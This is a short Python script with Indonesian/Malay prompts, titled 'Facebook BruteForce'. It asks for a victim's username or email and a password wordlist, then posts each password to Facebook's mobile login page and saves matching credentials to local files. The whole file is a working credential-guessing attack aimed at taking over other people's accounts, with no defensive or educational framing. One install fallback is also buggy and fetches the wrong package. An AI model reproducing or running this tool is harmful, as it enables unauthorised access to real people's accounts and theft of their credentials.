#!/usr/bin/python
# -*- coding: iso-8859-1 -*-

import os,sys,time
try:
	import requests
except:
	os.system('pkg install pip')
	os.system('pip install requests')
try:
	import pyfiglet
except:
	os.system('pkg install pip')
	os.system('pip install requests')
#os.system('clear')

garis = ' ======== '
#Bahan
url = 'https://mobile.facebook.com/login.php'
headers = {
	  'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16','Accept-Langue' : 'en-US,en:q=0.5'
}

aman = open('aman.txt','a')
sesi = open('sesi.txt','a')

def request():
	password = open(wordlist,'r').readlines()
	print(""+garis,"Jumlah Password : ",len(password),garis+"")
	id = input("\nMasukin Username  atau Email Korbanya : ")
	for line in password:
		pw = line.strip()
		data = {
			'email':id,
			'pass':pw
		}
		r = requests.post(url,headers=headers,data=data)
		if('home.php?' in r.url or 'free' in r.url):
			aman1 = '\n[√] Akun Aman\nUsername : '+id+'\nPassword : '+pw
			print(aman1)
			aman.write(aman1)
			os.sys.exit()
		elif('checkpoint' in r.url):
			sesi1 = '\n[!] Akun Checkpoint BERJAYA!!\nUsername : '+id+'\nPassword : '+pw
			print(sesi1)
			sesi.write(sesi1)
			os.sys.exit()
		else:
			print('Mencoba Password : ',pw)
			
if __name__=='__main__':
	name = ("\n\n ---------- Facebook BruteForce -----------")
	print(name)
	print(" *** [  Untuk Godam Akaun Facebook  ] ***\n\n cara kerjanya:\n mamasukan pasaword berulang2.. sehingga menemukan password yg TEPAT!!\n Kena tahu cara kerjanya juga.\n\n")
	wordlist = input("Masukan Senarai Passwordnya : ")
	request()
